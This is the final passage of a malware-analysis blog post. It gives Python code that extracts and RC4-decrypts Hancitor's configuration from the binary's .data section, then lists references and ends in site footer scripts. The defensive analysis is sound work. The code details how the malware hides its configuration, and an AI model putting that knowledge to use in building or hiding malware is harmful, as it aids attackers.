    <span class="k">print</span><span class="p">(</span><span class="n">extracted_config</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span> <span class="c1">#Prints in Unicode
</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">file_path</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Pls enter the file path: "</span><span class="p">)</span>
    <span class="n">data_section</span> <span class="o">=</span> <span class="n">Get_Date_Section</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
    <span class="c1">#The config data begins at offset 16 inside the .data section
</span>    <span class="n">full_configuration</span> <span class="o">=</span> <span class="n">data_section</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>

    <span class="c1">#The key is the first 8 bytes while the encrypted data is the rest
</span>    <span class="n">key</span> <span class="o">=</span> <span class="n">full_configuration</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">full_configuration</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>

    <span class="c1">#The RC4 key is only the first 5 bytes = 10 hex digits
</span>    <span class="n">hashed_key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
    <span class="n">rc4_key</span> <span class="o">=</span> <span class="n">hashed_key</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span>

    <span class="n">rc4_decryption</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">rc4_key</span><span class="p">),</span><span class="n">data</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<h1 id="refrences">Refrences</h1>

<ul>
  <li><a href="https://www.binarydefense.com/analysis-of-hancitor-when-boring-begets-beacon">https://www.binarydefense.com/analysis-of-hancitor-when-boring-begets-beacon</a></li>
  <li><a href="https://elis531989.medium.com/dissecting-and-automating-hancitors-config-extraction-1a6ed85d99b8">https://elis531989.medium.com/dissecting-and-automating-hancitors-config-extraction-1a6ed85d99b8</a></li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware Analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-09-09T00:00:00+00:00">September 9, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="#" class="pagination--pager disabled">Previous</a>
    
    
      <a href="/malware%20analysis/redline/" class="pagination--pager" title="RedLine Infostealer
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 Nidal Fikri. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <script>
  window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
  ga('create','UA-207369386-2','auto');
  ga('set', 'anonymizeIp', false);
  ga('send','pageview')
</script>
<script src="https://www.google-analytics.com/analytics.js" async></script>









  </body>
</html>
